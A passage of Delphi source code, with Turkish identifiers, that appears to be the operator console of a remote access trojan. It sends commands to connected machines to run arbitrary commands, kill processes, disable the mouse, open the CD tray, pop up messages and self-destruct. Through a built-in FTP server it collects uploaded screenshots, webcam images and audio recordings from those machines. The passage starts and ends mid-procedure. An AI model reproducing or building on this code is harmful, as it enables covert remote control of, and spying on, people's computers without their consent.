oglkapat;
flatbutton38.colorborder:=cllime;
flatbutton38.colorFocused:=clgreen;
panel17.Visible:=false;
end;

flatbutton48.colorborder:=cllime;
flatbutton51.colorborder:=cllime;
flatbutton29.colorborder:=clmaroon;
flatbutton38.colorborder:=cllime;
flatbutton4.colorborder:=cllime;
flatbutton5.colorborder:=cllime;

flatbutton48.colorFocused:=clgreen;
flatbutton51.colorFocused:=clgreen;
flatbutton29.colorFocused:=clmaroon;
flatbutton38.colorFocused:=clgreen;

flatbutton39.Colorfocused:=clgreen;
flatbutton39.ColorBorder:=cllime;

listview1.Visible:=false;
panel14.Visible:=false;
panel15.Visible:=False;
panel1.Visible:=true;
memo1.visible:=false;
listbox1.Visible:=false;
listbox2.Visible:=false;

flatbutton25.visible:=false;
flatbutton7.visible:=false;
flatbutton2.visible:=false;
flatedit2.visible:=false;
end;

procedure TForm1.FlatButton24Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/FARE KAPA'+'|.');
end;

procedure TForm1.FlatButton30Click(Sender: TObject);
begin
flatbutton30.ColorBorder:=clred;
flatbutton28.ColorBorder:=clblack;
flatbutton35.ColorBorder:=clblack;
flatbutton32.ColorBorder:=clblack;
end;

procedure TForm1.FlatButton32Click(Sender: TObject);
begin
flatbutton30.ColorBorder:=clblack;
flatbutton28.ColorBorder:=clblack;
flatbutton35.ColorBorder:=clblack;
flatbutton32.ColorBorder:=clred;
end;

procedure TForm1.FlatButton33Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/LS');
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
bagli:integer;
begin
try
bagli:=serversocket1.Socket.ActiveConnections;
if bagli > 0 then aktarimkilidi:=true;
if bagli=0 then begin
aktarimkilidi:=false;
if not butonkapali then butonkapa;
end;
if strtoint(flatedit9.Text) > bagli then flatedit9.Text:=inttostr(bagli);
flatbutton48.Caption:=balanti+' ('+inttostr(bagli)+')';
except on exception do exit;
end;
end;

procedure TForm1.FlatButton34Click(Sender: TObject);
var
ikon,hede:cardinal;
begin
ikon:=0;
hede:=0;
if flatbutton30.ColorBorder=clred then ikon:=$00000010;
if flatbutton28.ColorBorder=clred then ikon:=$00000030;
if flatbutton35.ColorBorder=clred then ikon:=$00000020;
if flatbutton32.ColorBorder=clred then ikon:=$00000040;

if flatradiobutton3.Checked then hede:=$00000000;
if flatradiobutton4.Checked then hede:=$00000001;
if flatradiobutton5.Checked then hede:=$00000004;
if flatradiobutton6.Checked then hede:=$00000005;

messagebox(GetForegroundWindow,pchar(flatedit12.Text),pchar(flatedit17.Text),ikon or hede);
end;

procedure TForm1.zattiriClick(Sender: TObject);
begin
yenile;
end;

procedure TForm1.FlatButton35Click(Sender: TObject);
begin
flatbutton30.ColorBorder:=clblack;
flatbutton28.ColorBorder:=clblack;
flatbutton35.ColorBorder:=clred;
flatbutton32.ColorBorder:=clblack;
end;

procedure TForm1.FlatButton36Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/MC|'+inttostr(trackbar1.Position)+'|.');
end;

procedure TForm1.FlatButton31Click(Sender: TObject);
var
ikon,hede:string;
begin
ikon:='1';
hede:='1';
if flatbutton30.ColorBorder=clred then ikon:='1';
if flatbutton28.ColorBorder=clred then ikon:='2';
if flatbutton35.ColorBorder=clred then ikon:='3';
if flatbutton32.ColorBorder=clred then ikon:='4';

if flatradiobutton3.Checked then hede:='1';
if flatradiobutton4.Checked then hede:='2';
if flatradiobutton5.Checked then hede:='3';
if flatradiobutton6.Checked then hede:='4';
if flatcheckbox2.Checked then if not onayla(cmesaj[144]+flatedit17.Text+#13#10+cmesaj[145]+flatedit12.Text) then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/SMSG '+flatedit12.Text+'|'+flatedit17.Text+'|'+ikon+'|'+hede+'|.');
end;

procedure TForm1.FlatButton37Click(Sender: TObject);
var
bilgi : string;
begin
bilgi := inputbox(baslik,cmesaj[146],'');
if bilgi='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/PENGEL AC|'+bilgi+'|.');
end;

procedure TForm1.FlatButton40Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/PENGEL KAPA'+'|.');
end;

procedure TForm1.FormCreate(Sender: TObject);
begin

fkullanici:=encode64(strmd5(kullanici+'@'+makine));
fsifre:=encode64(strmd5(inttostr(gettickcount)));
ftpizin:=false;
aktarimkilidi:=false;
butonkapali:=true;
maxsikistirma:=10;
maxpaket:=1400;
zamanasimi:=150;
form1.Caption:=baslik;
opendialog1.InitialDir:=extractfilepath(paramstr(0));
savedialog1.InitialDir:=extractfilepath(paramstr(0));
savedialog1.Title:=baslik;
opendialog1.Title:=baslik;
application.Title:=baslik;
balanti:='Ba�lant�lar';
kasinti:='Dosya Aktar�mlar�';
duruntu:='DUR';
basinti:='Ba$la !';
AddSysTrayIcon;
timer1.Enabled:=true;
timer2.Enabled:=true;

ayaroku;
yerlimesaj;
memo1.Lines.Add(Baslik);
memo1.Lines.Add(teferruat);
//memo1.Lines.Add(cmesaj[147]);

try
if not fileexists(extractfilepath(paramstr(0))+'\'+ayardosyasi) then varsayilanlar;
if not fileexists(extractfilepath(paramstr(0))+ayardosyasi) then varsayilanlar;
if not directoryexists(extractfilepath(paramstr(0))+'Download') Then mkdir(extractfilepath(paramstr(0))+'Download');
if not directoryexists(extractfilepath(paramstr(0))+'Log') Then mkdir(extractfilepath(paramstr(0))+'Log');
except on exception do begin
 memo1.Lines.Add('-- unable to create download folder');
end;
end;

end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
if flatcheckbox13.Checked then logsakla;
if flatcheckbox21.Checked then begin
Action := caNone;
Hide;
exit;
end;
DeleteSysTrayIcon;
halt;
end;

procedure TForm1.uyariClick(Sender: TObject);
begin
form1.Show;
BringWindowToTop(Form1.Handle);
SetForegroundWindow(form1.Handle);
SendMessage(form1.Handle, WM_SYSCOMMAND, SC_RESTORE, form1.Handle);
end;

procedure TForm1.ServerSocket1ClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
var
i:integer;
begin
errorcode := 0;
if serversocket1.Socket.ActiveConnections = 0 then butonkapa;
if listview1.Items.Count =1 then begin
listview1.Clear;
exit;
end;

try
for i := 0 to listview1.Items.Count -1 do begin
if listview1.Items[i].Caption = inttostr(socket.SocketHandle) then begin
socket.Destroy;
listview1.Items.Delete(i);
end;
end;
except on exception do exit;
end;

bilgi(cmesaj[148],2);
end;

procedure TForm1.FlatButton44Click(Sender: TObject);
begin
try
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/IDLEUYAR');
except on exception do exit
end;
end;

procedure TForm1.FlatButton45Click(Sender: TObject);
begin
form3.Visible:=true;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/PUYARI AC'+'|.');
end;

procedure TForm1.FlatButton46Click(Sender: TObject);
begin
try
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/FATALITY');
except on exception do exit
end;
end;

procedure TForm1.FlatButton47Click(Sender: TObject);
begin
pcevap:='';
if serversocket1.Socket.ActiveConnections > 0 then ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('+iptal');
end;

procedure TForm1.MSNPopUp1URLClick(Sender: TObject; URL: String);
begin
form1.Show;
BringWindowToTop(Form1.Handle);
SetForegroundWindow(form1.Handle);
end;

procedure TForm1.FlatButton51Click(Sender: TObject);
begin
if panel17.Visible then begin
oglkapat;
flatbutton38.colorborder:=cllime;
flatbutton38.colorFocused:=clgreen;
panel17.Visible:=false;
end;
flatbutton48.colorborder:=cllime;
flatbutton51.colorborder:=clmaroon;
flatbutton29.colorborder:=cllime;
flatbutton38.colorborder:=cllime;
flatbutton39.ColorBorder:=cllime;
flatbutton4.colorborder:=cllime;
flatbutton5.colorborder:=cllime;

flatbutton48.colorFocused:=clgreen;
flatbutton51.colorFocused:=clmaroon;
flatbutton29.colorFocused:=clgreen;
flatbutton38.colorFocused:=clgreen;
flatbutton39.Colorfocused:=clgreen;

listview1.Visible:=false;
panel14.Visible:=true;
panel15.Visible:=False;
panel1.Visible:=false;
memo1.visible:=false;
listbox1.Visible:=false;
listbox2.Visible:=false;

flatbutton25.visible:=false;
flatbutton7.visible:=false;
flatbutton2.visible:=false;
flatedit2.visible:=false;
end;

procedure TForm1.FlatButton52Click(Sender: TObject);
begin
if flatedit7.Text='' then exit;
flatlistbox1.Items.Add(flatedit7.Text);
flatedit7.Clear;
end;

procedure TForm1.ListView1DblClick(Sender: TObject);
begin
if listview1.ItemIndex=-1 then exit;
flatedit9.Text:=inttostr(listview1.itemindex);
label14.Font.Color:=clsilver;
label14.Caption:=cmesaj[149]+inttostr(listview1.itemindex);
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('+RL');
end;

procedure TForm1.FlatButton48Click(Sender: TObject);
begin
if panel17.Visible then begin
oglkapat;
flatbutton38.colorborder:=cllime;
flatbutton38.colorFocused:=clgreen;
panel17.Visible:=false;
end;
flatbutton48.colorborder:=clmaroon;
flatbutton51.colorborder:=cllime;
flatbutton29.colorborder:=cllime;
flatbutton38.colorborder:=cllime;
flatbutton39.ColorBorder:=cllime;
flatbutton4.colorborder:=cllime;
flatbutton5.colorborder:=cllime;

flatbutton48.colorFocused:=clmaroon;
flatbutton51.colorFocused:=clgreen;
flatbutton29.colorFocused:=clgreen;
flatbutton38.colorFocused:=clgreen;
flatbutton39.Colorfocused:=clgreen;

listview1.Visible:=true;
panel14.Visible:=False;
panel15.Visible:=False;
panel1.Visible:=false;
memo1.visible:=false;
listbox1.Visible:=false;
listbox2.Visible:=false;

flatbutton25.visible:=false;
flatbutton7.visible:=false;
flatbutton2.visible:=false;
flatedit2.visible:=false;
end;

procedure TForm1.FlatButton39Click(Sender: TObject);
begin

if panel17.Visible then begin
oglkapat;
flatbutton38.colorborder:=cllime;
flatbutton38.colorFocused:=clgreen;
panel17.Visible:=false;
end;

if memo1.Visible then exit;
konsolabasargibi;
memo1.Lines.append('');
memo1.Lines.Delete(memo1.Lines.Count-1);
end;

procedure TForm1.parla1Timer(Sender: TObject);
label
bitir;
begin

if flatbutton39.ColorBorder=clred then begin
flatbutton39.ColorBorder:=cllime;
goto bitir;
end;

if flatbutton39.ColorBorder=cllime then begin
flatbutton39.ColorBorder:=clred;
goto bitir;
end;

bitir:
say1:=say1+1;

if say1 > 7 then begin
say1:=0;
parla1.enabled:=False;
exit;
end;

end;

procedure TForm1.parla2Timer(Sender: TObject);
label
bitir;
begin

if flatbutton51.ColorBorder=clred then begin
flatbutton51.ColorBorder:=cllime;
goto bitir;
end;

if flatbutton51.ColorBorder=cllime then begin
flatbutton51.ColorBorder:=clred;
goto bitir;
end;

bitir:
say2:=say2+1;

if say2 > 7 then begin
say2:=0;
parla2.enabled:=False;
exit;
end;
end;

procedure TForm1.Yenile1Click(Sender: TObject);
begin
yenile;
end;


procedure TForm1.FlatButton14Click(Sender: TObject);
begin
flatbutton12.ColorBorder:=cllime;
flatbutton13.ColorBorder:=cllime;
flatbutton14.ColorBorder:=clmaroon;
flatbutton19.ColorBorder:=cllime;

flatbutton12.Colorfocused:=clgreen;
flatbutton13.Colorfocused:=clgreen;
flatbutton14.Colorfocused:=clmaroon;
flatbutton19.Colorfocused:=clgreen;

panel10.visible:=false;
panel11.visible:=true;
panel5.visible:=false;
panel9.visible:=false;
panel12.visible:=false;
end;

procedure TForm1.FlatButton1Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/SBILGI');
end;

procedure TForm1.FlatButton7Click(Sender: TObject);
begin
try
if flatedit2.Text='' then exit;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DOS '+flatedit2.Text);
flatedit2.Clear;
except on exception do exit;
end;
end;

procedure TForm1.FlatEdit19MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if length(flatedit19.text) > 3 then flatedit19.Text:=inttostr(18);
end;

procedure TForm1.ProgramKapat1Click(Sender: TObject);
begin
try
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/INTIHAR');
except on exception do exit
end;
end;

procedure TForm1.BaglantyKes1Click(Sender: TObject);
begin
try
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/BKES');
except on exception do exit
end;
end;

procedure TForm1.ping1Click(Sender: TObject);
begin
try
ServerSocket1.Socket.connections[listview1.ItemIndex].SendText('+ping'+Inttostr(gettickcount));
except on exception do exit
end;
end;

procedure TForm1.Kullan1Click(Sender: TObject);
begin
try
if listview1.ItemIndex=-1 then exit;
flatedit9.Text:=inttostr(listview1.itemindex);
label14.Font.Color:=clsilver;
label14.Caption:=cmesaj[149]+inttostr(listview1.itemindex);
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('+RL');
except on exception do exit;
end;
end;

procedure TForm1.SoketiKapat1Click(Sender: TObject);
begin
try
if listview1.ItemIndex=-1 then exit;
ServerSocket1.Socket.connections[listview1.ItemIndex].Destroy;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[150]+inttostr(listview1.itemindex);
except on exception do exit;
end;
end;

procedure TForm1.FlatButton55Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/ETEMIZLE');
end;

procedure TForm1.FormPaint(Sender: TObject);
var
rect,rec2:trect;
begin
rect.Left:=memo1.Left-1;
rect.Top:=memo1.Top-1;
rect.Right:=memo1.Width+memo1.Left+1;
rect.Bottom:=listview1.Height+listview1.Top+1;
form1.Canvas.Brush.Color:=clgreen;
form1.Canvas.FillRect(rect);
rec2.Left:=0;
rec2.Top:=0;
rec2.Right:=form1.Width;
rec2.Bottom:=form1.Height;
form1.Canvas.FillRect(rec2);
rec2.Left:=2;
rec2.Top:=0;
rec2.Right:=form1.Width-2;
rec2.Bottom:=form1.Height-2;
form1.Canvas.Brush.Color:=form1.Color;
form1.Canvas.FillRect(rec2);
end;

procedure TForm1.FlatCheckBox8Click(Sender: TObject);
begin

if flatcheckbox8.Checked then begin
label11.Enabled:=false;
label12.Enabled:=false;
flatedit13.Enabled:=false;
flatedit14.enabled:=false;
end;

if not flatcheckbox8.Checked then begin
label11.Enabled:=true;
label12.Enabled:=true;
flatedit13.Enabled:=true;
flatedit14.enabled:=true;
end;

end;

procedure gelendosya(soket,kaynak,dosya,kimlik:string);
var
listitem: Tlistitem;
begin
listitem:=form1.ListView3.Items.Add;
listitem.ImageIndex:=0;
listitem.Caption:=soket;
listitem.SubItems.Add(kaynak);
listitem.SubItems.Add(dosya);
listitem.SubItems.Add('-');
listitem.SubItems.Add(kimlik);
end;

procedure gidendosya(soket,kaynak,dosya,kimlik:string);
var
listitem: Tlistitem;
begin
listitem:=form1.ListView3.Items.Add;
listitem.ImageIndex:=3;
listitem.Caption:=soket;
listitem.SubItems.Add(kaynak);
listitem.SubItems.Add(dosya);
listitem.SubItems.Add('-');
listitem.SubItems.Add(kimlik);
end;


procedure TForm1.Timer2Timer(Sender: TObject);
begin
flatbutton51.Caption:=kasinti+' ('+inttostr(bl)+')';
end;

procedure TForm1.Gebert1Click(Sender: TObject);
begin
try
if form1.flatcheckbox2.Checked then begin
if onayla(listbox1.Items.Strings[listbox1.ItemIndex]) then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PGEBERT '+listbox1.Items.Strings[listbox1.ItemIndex]+'|.');
end;
if form1.flatcheckbox2.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PGEBERT '+listbox1.Items.Strings[listbox1.ItemIndex])
end;
finally
end;
end;

procedure TForm1.MenuItem2Click(Sender: TObject);
begin
try
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PRG')
finally
end;
end;

procedure TForm1.Yeniilem1Click(Sender: TObject);
var
bilgi:String;
begin
try
bilgi := inputbox(cmesaj[154],cmesaj[155],'');
if bilgi='' then exit;
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/EXEC '+bilgi);
finally
end;
end;

procedure TForm1.Kapat1Click(Sender: TObject);
begin
try
if form1.flatcheckbox2.Checked then begin
if onayla(listbox2.Items.Strings[listbox2.ItemIndex]) then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PGETIR '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
if form1.flatcheckbox2.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PGETIR '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
except on exception do exit;
end;
end;

procedure TForm1.Flash1Click(Sender: TObject);
begin
try
if form1.flatcheckbox2.Checked then begin
if onayla(listbox2.Items.Strings[listbox2.ItemIndex]) then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PFLASH '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;

if form1.flatcheckbox2.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PFLASH '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;

except on exception do exit;
end;
end;

procedure TForm1.Sakla1Click(Sender: TObject);
begin
try
if form1.flatcheckbox2.Checked then begin
if onayla(listbox2.Items.Strings[listbox2.ItemIndex]) then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PSAKLA '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;

if form1.flatcheckbox2.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PSAKLA '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
except on exception do exit;
end;
end;

procedure TForm1.Gster1Click(Sender: TObject);
begin
try
if form1.flatcheckbox2.Checked then begin
if onayla(listbox2.Items.Strings[listbox2.ItemIndex]) then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PGSTER '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
if form1.flatcheckbox2.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PGSTER '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
except on exception do exit;
end;
end;

procedure TForm1.MenuItem5Click(Sender: TObject);
begin
try
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/TL')
except on exception do exit;
end;
end;

procedure Tform1.basargibi1;
begin
if panel17.Visible then begin
oglkapat;
flatbutton38.colorborder:=cllime;
flatbutton38.colorFocused:=clgreen;
panel17.Visible:=false;
end;
flatbutton48.colorborder:=cllime;
flatbutton51.colorborder:=cllime;
flatbutton4.colorborder:=clmaroon;
flatbutton5.colorborder:=cllime;
flatbutton29.colorborder:=cllime;
flatbutton38.colorborder:=cllime;
flatbutton39.ColorBorder:=cllime;

flatbutton48.colorFocused:=clgreen;
flatbutton51.colorFocused:=clgreen;
flatbutton4.colorfocused:=clmaroon;
flatbutton5.colorfocused:=clgreen;
flatbutton29.colorFocused:=clgreen;
flatbutton38.colorFocused:=clgreen;
flatbutton39.Colorfocused:=clgreen;

listview1.Visible:=false;
panel14.Visible:=false;
panel15.Visible:=False;
panel1.Visible:=false;
memo1.visible:=false;
listbox1.Visible:=true;
listbox2.Visible:=false;

flatbutton25.visible:=false;
flatbutton7.visible:=false;
flatbutton2.visible:=false;
flatedit2.visible:=false;
end;

procedure Tform1.basargibi2;
begin
if panel17.Visible then begin
oglkapat;
flatbutton38.colorborder:=cllime;
flatbutton38.colorFocused:=clgreen;
panel17.Visible:=false;
end;
flatbutton48.colorborder:=cllime;
flatbutton51.colorborder:=cllime;
flatbutton4.colorborder:=cllime;
flatbutton5.colorborder:=clmaroon;
flatbutton29.colorborder:=cllime;
flatbutton38.colorborder:=cllime;
flatbutton39.ColorBorder:=cllime;

flatbutton48.colorFocused:=clgreen;
flatbutton51.colorFocused:=clgreen;
flatbutton29.colorFocused:=clgreen;
flatbutton38.colorFocused:=clgreen;
flatbutton39.Colorfocused:=clgreen;
flatbutton5.colorFocused:=clmaroon;
flatbutton4.colorFocused:=clgreen;

listview1.Visible:=false;
panel14.Visible:=false;
panel15.Visible:=False;
panel1.Visible:=false;
memo1.visible:=false;
listbox1.Visible:=false;
listbox2.Visible:=true;

flatbutton25.visible:=false;
flatbutton7.visible:=false;
flatbutton2.visible:=false;
flatedit2.visible:=false;
end;

procedure TForm1.Kapat2Click(Sender: TObject);
begin
try
if form1.flatcheckbox2.Checked then begin
if onayla(listbox2.Items.Strings[listbox2.ItemIndex]) then form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PKAPAT '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
if form1.flatcheckbox2.Checked=false then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/PKAPAT '+listbox2.Items.Strings[listbox2.ItemIndex]+'|.')
end;
except on exception do exit;
end;
end;

procedure TForm1.FlatButton50Click(Sender: TObject);
begin
label14.Caption:='';
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('+ping'+Inttostr(gettickcount));
end;

procedure TForm1.FlatButton54Click(Sender: TObject);
begin
label14.Caption:='';
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('+idle');
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
ftpserver1.DisconnectAll;
end;

procedure TForm1.FtpServer1StorSessionClosed(Sender: TObject;
  Client: TFtpCtrlSocket; Data: TWSocket; Error: Word);
var
i,x:integer;
str,dosia,kimliq,skimdeki:string;
label
xxxx,
hoba,
hede;
begin
bl:=bl-1;
dosia:=client.FileName;
kimliq:=copy(dosia,1,pos('\',dosia)-1);
dosia:=copy(dosia,pos('\',dosia)+1,length(dosia));

str:=cmesaj[156];
x:=1;

if error <> 0 then begin
str:=cmesaj[157];
x:=2;
end;

if length(kimliq) = 0 then goto hoba;

if xgetfilesize(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia) div 1024 div 1024 > maxsikistirma then goto hede;
lhac(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia,extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia+'.tmp');
if fileexists(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia+'.tmp') then deletefile(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia);
renamefile(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia+'.tmp',extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia);

hede:

if copy(dosia,1,5) = 'ekran' then begin
image1.Picture.LoadFromFile(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia);
image2.Picture.LoadFromFile(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia);
ekrandaki:=extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia;
label1.Caption:=cmesaj[158]+inttostr(xgetfilesize(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia) div 1024)+ 'kb';
label5.Caption:=kimliq;
if not flatcheckbox10.Checked then deletefile(ekrandaki);
baspanelecekvurbeni;
goto xxxx;
end;

if copy(dosia,1,3) = 'cam' then begin
image1.Picture.LoadFromFile(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia);
image2.Picture.LoadFromFile(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia);
ekrandaki:=extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia;
label1.Caption:=cmesaj[158]+inttostr(xgetfilesize(extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia) div 1024)+ 'kb';
label5.Caption:=kimliq;
if not flatcheckbox10.Checked then deletefile(ekrandaki);
baspanelecekvurbeni;
goto xxxx;
end;

if copy(dosia,1,3) = 'ses' then begin
skimdeki:=extractfilepath(paramstr(0))+'download\'+kimliq+'\'+dosia;
ShellExecute(0,'open',PChar(skimdeki),nil,nil,SW_SHOW);
goto xxxx;
end;

hoba:

if pos('jpg',dosia) > 0 then begin
image1.Picture.LoadFromFile(extractfilepath(paramstr(0))+'download\'+dosia);
image2.Picture.LoadFromFile(extractfilepath(paramstr(0))+'download\'+dosia);
ekrandaki:=extractfilepath(paramstr(0))+'download\'+dosia;
label1.Caption:=cmesaj[158]+inttostr(xgetfilesize(extractfilepath(paramstr(0))+'download\'+dosia) div 1024)+ 'kb';
label5.Caption:='';
baspanelecekvurbeni;
end;

xxxx:
if str=cmesaj[156] then begin
if flatcheckbox11.checked then PlayWavFile('efekt4');
end;

parla2.Enabled:=true;

try
for i := 0 to listview3.Items.Count -1 do begin
if listview3.Items[i].Caption = inttostr(client.DataSocket.HSocket) then begin
listview3.items[i].Caption:=str;
listview3.Items[i].ImageIndex:=x;
if copy(dosia,1,5) = 'ekran' then listview3.Items.Delete(i);
if copy(dosia,1,3) = 'cam' then listview3.Items.Delete(i);
if copy(dosia,1,3) = 'ses' then listview3.Items.Delete(i);
end;
end;
except on exception do exit;
end;
end;


procedure TForm1.iptal1Click(Sender: TObject);
var
hede:Tlistitem;
stryap:string;
begin
try
if ListView3.Selected.Index=-1 then exit;
hede:=listview3.Selected;
stryap:=extractfilepath(paramstr(0))+'download\'+hede.SubItems.Strings[3]+'\'+hede.SubItems.Strings[1];
ShellExecute(0,'open',PChar(stryap),nil,nil,SW_SHOW);
except on exception do exit;
end;
end;

procedure TForm1.ListView3ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
begin
try
if listview3.Items.Count=0 then exit;
if ListView3.Selected.Index=-1 then exit;
if ListView3.Selected.Caption=cmesaj[156] Then iptal1.enabled:=True else iptal1.enabled:=False;
except on exception do exit;
end;
end;

procedure TForm1.ListView3DblClick(Sender: TObject);
var
hede:Tlistitem;
stryap:string;
begin
try
if ListView3.Selected.Index=-1 then exit;
if listview3.Selected.Caption <> cmesaj[156] Then exit;
hede:=listview3.Selected;
stryap:=extractfilepath(paramstr(0))+'download\'+hede.SubItems.Strings[3]+'\'+hede.SubItems.Strings[1];
ShellExecute(0,'open',PChar(stryap),nil,nil,SW_SHOW);
except on exception do exit;
end;
end;

procedure TForm1.BitmileriTemizle1Click(Sender: TObject);
var
hede:Tlistitem;
stryap:string;
begin
try
if listview3.items.count=0 then exit;
if ListView3.Selected.Index=-1 then exit;
//if listview3.Selected.caption <> 'Tamam' then exit;
hede:=listview3.Selected;
stryap:=extractfilepath(paramstr(0))+'download\'+hede.SubItems.Strings[3]+'\';
ShellExecute(0,'open',PChar(stryap),nil,nil,SW_SHOW);
except on exception do exit;
end;
exit;
end;


procedure TForm1.mBaglantlarKes2Click(Sender: TObject);
begin
ftpserver1.DisconnectAll;
end;


procedure TForm1.emizle1Click(Sender: TObject);
var
i:integer;
iytem:Tlistitem;
begin
try
if ftpserver1.ClientCount = 0 then begin
listview3.Clear;
exit;
end;
if listview3.Items.Count=0 then exit;
for i := 0 to listview3.Items.Count -1 do begin
iytem:=listview3.Items.Item[i];
if iytem.Caption=cmesaj[156] then iytem.Delete;
if iytem.Caption=cmesaj[157] then iytem.Delete;
if iytem.Caption=cmesaj[159] then iytem.delete;
end;
except on exception do exit;
end;
end;

procedure TForm1.GrnmeyePencereleriListele1Click(Sender: TObject);
begin
try
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/ATL')
except on exception do exit;
end;
end;

procedure TForm1.BalkDegitir1Click(Sender: TObject);
var
bilgi:String;
begin
try
bilgi := inputbox(baslik,cmesaj[160],listbox2.Items.Strings[listbox2.ItemIndex]);
if bilgi='' then exit;
if bilgi=listbox2.Items.Strings[listbox2.ItemIndex] then exit;
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/BDEGIS '+listbox2.Items.Strings[listbox2.ItemIndex]+'|'+bilgi+'|.');
except on exception do exit;
end;

end;

procedure TForm1.IdleBozuluncaHaberVer1Click(Sender: TObject);
begin
try
ServerSocket1.Socket.connections[listview1.ItemIndex].SendText('/IDLEUYAR');
except on exception do exit
end;
end;

procedure TForm1.Image1DblClick(Sender: TObject);
begin
ShellExecute(0,'open',PChar(ekrandaki),nil,nil,SW_SHOW);
end;

procedure TForm1.k1Click(Sender: TObject);
begin
DeleteSysTrayIcon;
halt;
end;

procedure TForm1.asdasd1Click(Sender: TObject);
begin
form1.Visible:=true;
form1.Show;
setforegroundwindow(form1.Handle);
end;

procedure TForm1.DosyaYneticisi1Click(Sender: TObject);
begin
form2.Visible:=true;
form2.Show;
setforegroundwindow(form2.Handle);
end;

procedure TForm1.ListView1Change(Sender: TObject; Item: TListItem;
  Change: TItemChange);
begin
if flatcheckbox13.Checked then logsakla;
end;

procedure TForm1.FlatButton41Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/CROM AC'+'|.');
end;

procedure TForm1.FlatButton57Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/CROM KAPA'+'|.');
end;

procedure TForm1.FlatEdit15DblClick(Sender: TObject);
begin
if colordialog1.Execute then flatedit15.Text:=inttostr(colordialog1.Color);
end;

procedure TForm1.FlatEdit16DblClick(Sender: TObject);
begin
if colordialog2.Execute then flatedit16.Text:=inttostr(colordialog2.Color);
end;

procedure TForm1.FlatCheckBox12Click(Sender: TObject);
begin

if flatcheckbox12.Checked then begin
scrollbox1.Visible:=false;
image1.Visible:=true;
image1.Stretch:=True;
image1.Repaint;
end;

if not flatcheckbox12.Checked then begin
